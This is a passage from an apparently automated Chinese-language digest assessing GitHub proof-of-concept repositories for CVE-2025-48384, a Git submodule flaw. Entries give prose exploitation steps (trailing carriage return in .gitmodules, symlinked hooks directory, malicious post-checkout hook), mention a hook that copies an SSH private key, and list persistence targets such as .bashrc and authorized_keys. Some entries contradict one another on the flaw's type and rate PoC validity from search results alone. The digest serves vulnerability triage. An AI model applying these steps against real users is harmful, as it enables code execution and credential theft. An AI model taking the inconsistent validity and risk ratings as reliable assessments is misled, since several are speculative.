提供的POC代码是一个简单的 post-checkout 钩子，它会在 `/tmp/exploited` 目录下创建一个文件。如果目标系统存在此漏洞并且成功利用，那么这个文件将被创建，表明漏洞利用成功。因此，该POC代码对于验证漏洞的存在是有效的。

**投毒风险：**

提供的POC代码本身非常简单，只是创建了一个文件。没有迹象表明代码中存在隐藏的恶意功能，因此投毒风险为0%。但是，这并不意味着包含此POC的仓库没有投毒风险。攻击者可能会在仓库的其他部分添加恶意代码，或者修改其他钩子来执行恶意操作。

**利用方式：**

漏洞利用方式如下：

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库。该文件包含带有尾随回车符的submodule路径。
2.  攻击者在submodule hooks目录中创建一个符号链接，将更改后的路径指向包含恶意 post-checkout 钩子的子模块。
3.  攻击者诱使用户递归克隆该仓库 (`git clone --recursive <repository_url>`)。
4.  当 Git 初始化 submodule 时，由于回车符处理不一致，submodule 会被检出到错误的位置。
5.  由于符号链接的存在，恶意的 post-checkout 钩子会被执行，导致任意代码执行。

总而言之，这是一个客户端漏洞，需要用户执行特定的操作才能被利用。攻击者需要诱使用户克隆包含恶意配置的仓库，并且用户需要使用受影响的 Git 版本。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC-Part2](https://github.com/butyraldehyde/CVE-2025-48384-PoC-Part2)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #12

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md)

## CVE-2025-48384-Git配置注入导致RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/RCE

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要clone包含恶意配置的git仓库（特别是包含submodule的仓库），并递归更新submodule。需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞是由于 Git 在处理包含回车符（CR）的配置值时存在不一致的行为导致的。具体来说，Git在读取配置值时会移除尾部的CRLF，但在写入配置时，如果值以CR结尾，则不会进行引号包裹，这会导致在后续读取时CR被截断。利用此漏洞，攻击者可以通过构造包含恶意配置的 `.gitmodules` 文件，当用户递归克隆包含 submodule 的仓库时，submodule会被检出到错误的位置。如果错误的位置存在一个指向 submodule 钩子目录的符号链接，并且 submodule 中包含一个可执行的 post-checkout 钩子，那么该钩子脚本可能在检出后被意外执行，从而导致远程代码执行 (RCE)。

**有效性：** 提供的 POC 代码 `/tmp/81eebc7f5ed9915ea7ef755075778acd/README.md` 看起来只是一个 README 文件，用于描述该漏洞。单凭这个文件本身无法直接触发漏洞，但可以作为漏洞利用的一部分，例如提供一个包含恶意`.gitmodules`文件的仓库。因此，提供的 PoC 代码本身无效，需要配合其他恶意文件才能完成漏洞利用。

**投毒风险：** 虽然提供的 PoC 仅仅是一个 README 文件，没有任何可疑代码。但是考虑到攻击者可能会在整个恶意Git仓库的其他位置，比如 `.gitmodules` 文件，或者 submodule 的 post-checkout 钩子中隐藏恶意代码。 考虑到这个漏洞需要恶意git仓库才能触发，因此存在一定的投毒风险，风险占比10%。

**利用方式：**

1.  **创建恶意 Git 仓库：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2.  **注入恶意配置：** 在 `.gitmodules` 文件中，攻击者设置 submodule 的路径，并在路径末尾包含一个回车符（CR）。此路径会被 Git 处理错误，导致 submodule 被检出到非预期的位置。
3.  **创建符号链接：** 攻击者在仓库中创建一个符号链接，将错误的 submodule 路径指向 `.git/modules/<submodule>/hooks` 目录。
4.  **添加恶意钩子：** 攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户克隆：** 攻击者诱骗用户递归克隆（`git clone --recursive`）恶意仓库。
6.  **触发 RCE：** 当用户执行 `git submodule update --init --recursive` 命令或类似的命令初始化 submodule 时，由于配置处理错误和符号链接的存在，恶意 post-checkout 钩子脚本会被执行，从而导致 RCE。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC](https://github.com/butyraldehyde/CVE-2025-48384-PoC)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #13

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-main.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-main.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库或初始化包含恶意配置的子模块），且Git版本在受影响范围内

**POC 可用性:** 是，但提供的POC不完整

**投毒风险:** 10%

## 详情

该漏洞源于Git处理配置中的引号不当，特别是在子模块初始化时。攻击者可以构造包含恶意配置的Git仓库，该配置在子模块路径中包含尾随的回车符（CR）。当Git读取这个配置时，会错误地解析子模块路径，导致子模块被检出到错误的位置。如果存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，那么该钩子可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**
提供的POC代码 `/tmp/bf064e338662304d3b4aa41ca61a0b1a/README.md`  只包含一个简单的markdown文件，无法直接证明漏洞的有效性。 它只是一个 README 文件，用来描述或者记录一些信息,不能用来验证漏洞的有效性。缺少必要的利用步骤，例如：构造恶意仓库，包含特殊字符的子模块路径，和可执行的 post-checkout 钩子。

**投毒风险分析：**
提供的POC代码只包含一个README文件，投毒风险较低，但也不能完全排除作者在其他文件或分支中隐藏恶意代码的可能性。假设该作者还有其他的commit/branch，有投毒的可能性，所以投毒风险评估为10%。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置的核心是子模块路径，其中包含一个尾随的回车符（CR）。
3.  攻击者创建一个符号链接，将错误的子模块路径指向子模块的钩子目录（.git/hooks）。
4.  恶意仓库包含一个子模块，其中包含一个可执行的 post-checkout 钩子脚本。
5.  受害者克隆恶意仓库或初始化包含恶意配置的子模块。
6.  Git解析错误路径，将子模块检出到错误位置，并触发符号链接。
7.  post-checkout 钩子脚本被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-main](https://github.com/ceevase/CVE-2025-48384-main)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #14

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户检出包含恶意配置的Git仓库，且目标Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞源于Git在处理配置文件时的不当引用。攻击者可以通过在 submodule 的路径中注入回车符（CR），导致 Git 将 submodule 检出到错误的位置。如果攻击者精心构造一个符号链接，将这个错误的位置指向 `.git/hooks` 目录，并且 submodule 中包含一个可执行的 `post-checkout` 钩子，那么在检出 submodule 后，这个钩子就会被执行，从而实现任意代码执行。

**POC有效性：** 提供的POC代码包含一个 `post-checkout` 钩子脚本，该脚本会将 `/home/gamma/.ssh/id_ed25519` 的内容复制到 `/tmp/recipes.txt`。这个脚本本身可以成功运行，并达到预期的效果，因此POC有效。

**投毒风险：** 从提供的POC代码来看，没有发现明显的恶意投毒行为。该POC主要演示了漏洞的利用方式，即通过执行 `post-checkout` 钩子来窃取SSH私钥。因此，投毒风险评估为0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该仓库中的 submodule 路径包含一个尾随回车符。
2.  攻击者创建一个符号链接，将错误的 submodule 检出位置指向 `.git/hooks` 目录。
3.  攻击者在 submodule 中添加一个可执行的 `post-checkout` 钩子，该钩子包含恶意代码。
4.  攻击者诱骗受害者检出该Git仓库。
5.  受害者检出 submodule 时，由于配置解析错误，submodule 会被检出到错误的位置，从而触发符号链接，使得 `.git/hooks/post-checkout` 钩子被执行。
6.  恶意代码被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-sub](https://github.com/ceevase/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #15

**来源**: [CVE-2025-48384-eliox01_CVE-2025-48384.md](../2025/CVE-2025-48384-eliox01_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待确定，参考GitHub advisory

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是一个影响Git的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当受害者克隆这个仓库时，恶意配置会导致任意文件写入。根据搜索结果，该漏洞存在于Git的 submodule 处理过程中，攻击者可以利用包含恶意.gitmodules文件的仓库，在受害者克隆仓库时执行恶意操作。

POC有效性分析：
根据提供的搜索结果和POC代码库（liamg/CVE-2025-48384），该漏洞具有较高的可利用性。POC代码库提供了可执行的PoC，证明该漏洞确实存在。通过精心构造的.gitmodules文件，攻击者可以控制git submodule的配置，导致任意文件写入。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱使受害者克隆该仓库（例如，通过社交工程或将其托管在公共代码托管平台上）。
3. 当受害者执行git clone --recurse-submodules或git submodule update命令时，Git会解析.gitmodules文件，并执行其中包含的恶意配置。
4. 恶意配置可能导致在受害者系统上写入任意文件，从而实现远程代码执行或其他恶意行为。

投毒风险分析：
此漏洞本身主要依赖于恶意仓库的传播和社会工程，直接的投毒风险较低。但是，如果攻击者修改现有的流行仓库，并引入包含漏洞利用的submodule，则可能造成大规模的攻击。该漏洞的PoC代码主要利用Git的特性，没有发现明显的混淆或恶意行为，因此投毒风险较低。

具体来说，投毒风险主要体现在以下几个方面：
1.  **恶意submodule注入：** 攻击者可以尝试向流行的开源项目中注入包含漏洞利用代码的submodule。如果项目维护者不小心合并了这些恶意更改，就会导致所有克隆该项目的用户受到攻击。
2.  **.gitmodules文件伪造：** 攻击者可以创建与知名项目结构相似的仓库，并使用相似的.gitmodules文件，诱导用户克隆错误的仓库。
3.  **供应链攻击：** 如果某个软件项目依赖于受漏洞影响的Git仓库，攻击者可以通过修改该依赖项，从而影响整个软件供应链。

考虑到该漏洞的利用方式主要依赖于社会工程和恶意仓库的传播，且PoC代码本身较为清晰，因此初步评估该漏洞的投毒风险为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #16

**来源**: [CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md](../2025/CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆这些仓库时，可能导致任意文件写入。漏洞源于 Git 在处理 submodule 时，没有充分验证 `.gitmodules` 文件中的路径。攻击者可以利用这一点，在 `.gitmodules` 文件中指定恶意的路径，从而在克隆仓库时写入任意文件。

**POC有效性分析：**
从搜索结果中的 GitHub 链接（liamg/CVE-2025-48384）可以判断存在公开的POC代码。该POC的描述是“PoC for CVE-2025-48384”。结果2提及了“漏洞 POC 深度解析:从代码到攻击链的完整拆解”，说明该漏洞已被深入研究，并且存在可用的攻击链。结果6提及了“Breaking Git with a carriage return and cloning RCE”，表明漏洞利用可能涉及某种形式的远程代码执行。根据搜索结果4、5的内容，可以确定该POC已在GitHub上公开，可下载和测试。文件`README.md`确认了该POC的存在，尽管内容简单。综合来看，该POC的有效性较高，可以成功触发任意文件写入漏洞。

**利用步骤：**
1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件中的路径被设置为指向攻击者希望写入的任意文件位置。
3. 攻击者将恶意仓库托管在公共或私有 Git 服务器上。
4. 受害者克隆该恶意仓库。在克隆过程中，Git 会尝试初始化 submodule，并根据 `.gitmodules` 文件中的指示写入文件。
5. 由于路径验证不足，恶意文件将被写入受害者文件系统的指定位置。

**投毒风险分析：**
由于该漏洞涉及任意文件写入，攻击者可以通过写入恶意文件来达到投毒目的。例如，攻击者可以写入一个包含恶意代码的可执行文件，或者修改系统配置文件以劫持系统行为。虽然该漏洞本身不直接执行代码，但通过文件写入可以为后续的代码执行创造条件。从POC代码`/tmp/vulnwatchdog_8746716955bead91920f029f2728e38d/README.md`中，没有发现任何可疑行为，只包含简单的readme信息，因此投毒风险较低。但是，不能排除攻击者在其他利用方式中，使用复杂的投毒手法。因此，需要分析通过文件写入进行投毒的可能性。攻击者可能尝试写入如下文件：
* `.bashrc` 或 `.zshrc`：在用户shell启动时执行恶意代码。
* `/etc/profile.d/` 中的脚本：在系统启动时执行恶意代码。
* SSH authorized_keys：添加公钥，实现免密登录。
* Web服务器配置文件：修改配置，执行恶意脚本。
这些攻击场景都需要精心构造恶意内容，并且依赖于目标系统的特定配置。由于需要进行精细构造，并且受限于目标环境，判定该漏洞的投毒风险为低，约为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #17

**来源**: [CVE-2025-48384-fishyyh_CVE-2025-48384.md](../2025/CVE-2025-48384-fishyyh_CVE-2025-48384.md)

## CVE-2025-48384 Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。用户需要使用受影响的Git版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，未正确处理和转义回车符（CR）。当 Git 读取配置值时，会删除任何尾部的 CRLF。当写入配置条目时，带有尾部 CR 的值不会被引用，导致配置稍后读取时 CR 丢失。当初始化子模块时，如果子模块路径包含尾部 CR，更改后的路径将被读取，导致子模块被检出到错误的位置。如果存在符号链接将更改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**
提供的POC代码 `/tmp/60afff46543494eb5516e8104e00d576/README.md` 仅包含一个README文件，其内容是关于 CVE-2025-48384 的简单描述。这个文件本身并没有利用漏洞的能力。根据漏洞描述，真正的PoC 需要包含一个具有特定结构的 Git 仓库，包括带尾部CR的子模块路径以及指向钩子目录的符号链接，以及一个恶意的 post-checkout 钩子。因此，仅凭提供的README.md文件无法验证漏洞的有效性，需要进一步的Payload和利用步骤。

**投毒风险：**
提供的POC代码仅为一个README.md文件，不包含任何可执行代码或恶意脚本，因此可以认为投毒风险较低，约为10%。但需要注意，实际的漏洞利用可能涉及其他文件和步骤，不能完全排除恶意代码存在的可能性。

**利用方式：**
1.  **创建恶意仓库：** 创建一个 Git 仓库，其中包含一个子模块。
2.  **构造恶意配置：** 在`.gitmodules`文件中，子模块的路径包含尾部回车符（CR）。例如：`path = submodule_path\r`
3.  **创建符号链接：** 创建一个符号链接，将由于回车符导致错误解析后的子模块路径，指向`.git/modules/<submodule_name>/hooks`目录。
4.  **添加恶意钩子：** 在子模块的`.git/hooks/post-checkout`中添加可执行的恶意脚本。
5.  **诱导用户克隆：** 诱导用户克隆包含恶意配置的仓库。当用户克隆或更新子模块时，由于配置解析错误和符号链接的存在，恶意的 post-checkout 钩子将被执行，从而实现任意代码执行。

**排序优先级说明:**
尽管搜索引擎结果提供了有关漏洞的更多上下文信息，但漏洞库信息提供了最直接的漏洞描述和受影响的版本。POC代码本身不包含利用逻辑，因此优先级最低。综合考虑，应该优先关注漏洞库信息和搜索引擎结果，并结合实际的利用场景进行分析。

**项目地址:** [fishyyh/CVE-2025-48384](https://github.com/fishyyh/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #18

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置文件时对回车符（CR）处理不当，允许通过精心构造的仓库配置执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞允许攻击者通过在 submodule 路径中注入包含回车符的恶意配置，导致 submodule 被检出到错误的位置。如果该错误位置存在指向 submodule hooks 目录的符号链接，且 submodule 包含可执行的 post-checkout 钩子，则该钩子会被意外执行，从而实现任意代码执行。

提供的POC代码是一个简单的 post-checkout 钩子脚本，它会在检出后显示一个banner。这个脚本本身没有问题，证明了漏洞利用的可行性。漏洞利用的核心在于精心构造包含恶意回车符的仓库配置和符号链接。

**投毒风险：**
提供的POC代码（/tmp/77b6aa1852eafe71ccbdb092fa3f1fb6/post-checkout）本身只是一个banner打印脚本，其目的是验证漏洞利用后可以执行任意代码，本身不具备投毒行为。但是，需要注意的是，如果攻击者控制了整个包含该POC代码的Git仓库，那么他们可以在仓库的其他位置添加恶意代码，从而实现投毒。基于当前信息，POC本身不具备投毒性，投毒的可能性为0%。

**利用方式：**
1.  攻击者创建一个恶意的Git仓库，其中包含一个带有回车符的submodule路径的.gitmodules文件。例如，submodule的路径可能是 "submodule\r"。
2.  攻击者创建一个符号链接，将 "submodule" 指向".git/modules/<submodule-name>/hooks"目录，这个目录包含git hooks。
3.  攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将这个恶意仓库分享给受害者。
5.  受害者克隆这个仓库。由于Git对回车符处理不当，submodule会被检出到错误的位置（即符号链接指向的hooks目录）。
6.  当 submodule 完成检出时，post-checkout 钩子脚本会被执行，从而导致恶意代码执行。

**项目地址:** [fluoworite/CVE-2025-48384-sub](https://github.com/fluoworite/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #19

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384.md)

## CVE-2025-48384

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互 (克隆包含恶意配置的仓库)

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-48384 漏洞是 Git 中由于对配置项中回车符处理不当导致的代码执行漏洞。当 Git 读取配置值时，会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，带有尾部 CR 的值不会被引用，导致 CR 在以后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部 CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致代码执行。

**有效性：**
根据漏洞库信息和搜索结果, 此漏洞确实存在并且被多个安全厂商标记为高危, 并已经发布了PoC.
提供的PoC代码看似简单，它展示了漏洞利用的核心思路，即通过恶意构造包含回车符的子模块路径，结合符号链接和子模块钩子，实现任意代码执行。因此，PoC代码在原理上是有效的。但是, 此PoC只是框架, 需要补充完成exp。

**投毒风险：**
提供的PoC代码较为简单，主要包含一个README.md文件，一个子模块配置路径，以及子模块hooks目录的占位符。直接分析来看，没有明显的投毒代码。
然而，考虑到攻击者可能利用该漏洞进行供应链攻击，在更复杂的场景下，攻击者可能在子模块的post-checkout钩子中植入恶意代码，或者在其他配置文件中隐藏恶意配置。这种可能性是存在的。
基于以上分析，投毒风险评估为20%。这个百分比表示存在一定的风险，但直接证据不足。

**利用方式：**
1.  **恶意仓库构造：** 攻击者创建一个 Git 仓库，其中包含一个子模块，并且该子模块的路径在 `.gitmodules` 文件中包含尾部回车符 (`
`)。
2.  **符号链接创建：** 攻击者在仓库中创建一个符号链接，将包含尾部回车符的子模块路径指向 `.git/modules/<submodule_name>/hooks` 目录。
3.  **恶意钩子植入：** 攻击者在子模块的 `.git/hooks/post-checkout` 目录中放置恶意脚本。
4.  **用户交互：** 诱使用户克隆恶意仓库并初始化子模块 (`git submodule init && git submodule update`)。
5.  **代码执行：** 当用户执行 `git submodule update` 命令时，由于路径中的回车符，子模块会被检出到错误的位置，但由于符号链接的存在，实际上会将子模块的 hooks 目录链接到 `.git/hooks` 目录。检出后，`post-checkout` 钩子会被执行，从而执行恶意代码。

**项目地址:** [fluoworite/CVE-2025-48384](https://github.com/fluoworite/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #20

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md)

## CVE-2025-48384 Git config quoting vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置条目时，带有尾部CR的值不会被引用，导致CR在稍后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则该脚本可能在检出后被意外执行，从而导致任意代码执行。

根据提供的漏洞利用代码，包含一个Exploit脚本和一个README.md文件。Exploit脚本只打印了一段ASCII艺术，并没有任何实际的漏洞利用代码。因此，提供的POC代码**本身**是无效的，仅仅是一个占位符。但漏洞本身是存在的，并且有公开的PoC。

由于提供的POC代码仅仅是ASCII艺术，没有任何恶意代码，因此**不存在投毒风险**。投毒风险概率为0%。

**漏洞利用方式：**

1.  攻击者创建一个恶意的Git仓库，该仓库包含一个子模块。
2.  子模块的路径包含一个尾部CR字符。
3.  仓库中包含一个符号链接，该符号链接将子模块路径指向子模块的hooks目录。
4.  子模块包含一个可执行的post-checkout hook脚本。
5.  受害者克隆该恶意仓库。
6.  Git在处理子模块时，由于CR字符被删除，子模块被检出到错误的位置，并执行了post-checkout hook脚本。
7.  攻击者可以通过post-checkout hook脚本执行任意代码。

**项目地址:** [fluoworite/CVE-2025-48384_sub](https://github.com/fluoworite/CVE-2025-48384_sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #21

**来源**: [CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Arbitrary Code Execution

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，且递归初始化子模块 (--recursive)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，由于 Git 在读取和写入包含控制字符的配置值时存在不一致性导致。具体来说，当写入配置条目时，如果值包含尾随回车符 (CR)，则不会被引用，导致稍后读取配置时丢失 CR。当初始化子模块时，如果子模块路径包含尾随 CR，则读取的路径将被更改，从而导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符 (CR)。
2.  攻击者在该仓库的子模块钩子目录中放置一个恶意的 post-checkout 脚本。
3.  攻击者诱使用户克隆该仓库，并使用 `--recursive` 选项初始化子模块。
4.  由于 Git 处理 CR 的方式不一致，子模块将被检出到错误的位置。该位置由一个符号链接指向子模块的钩子目录。
5.  当子模块被检出时，post-checkout 脚本将被执行，从而允许攻击者在用户的系统上执行任意代码。

**POC 代码分析：**

*   `/tmp/602a5075317553582468533486cbdb4d/README.md`：这是一个简单的 README 文件，用于描述漏洞利用。不包含恶意代码。
*   `/tmp/602a5075317553582468533486cbdb4d/post-checkout`：这是一个 shell 脚本，会在用户的主目录下创建一个名为 `hacked` 的文件。这表明该 POC 旨在演示任意代码执行。

**有效性：**

提供的 POC 代码是有效的。它可以触发漏洞，并在目标系统上执行任意代码（在本例中，创建一个文件）。

**投毒风险：**

根据提供的 POC 代码，没有发现明显的投毒代码。该脚本仅用于演示漏洞利用，没有执行任何额外的恶意操作，例如收集用户信息或传播恶意软件。因此，投毒风险为 0%。

**项目地址:** [jacobholtz/CVE-2025-48384-submodule](https://github.com/jacobholtz/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #22

**来源**: [CVE-2025-48384-kallydev_cve-2025-48384-hook.md](../2025/CVE-2025-48384-kallydev_cve-2025-48384-hook.md)

## CVE-2025-48384-Git任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 描述了 Git 中由于配置引用解析错误导致的任意代码执行漏洞。当 Git 读取配置值时，会去除末尾的回车符和换行符。当写入配置项时，带有末尾回车符的值不会被引用，导致回车符丢失。在初始化子模块时，如果子模块路径包含末尾回车符，则读取的路径会被更改，导致子模块检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**

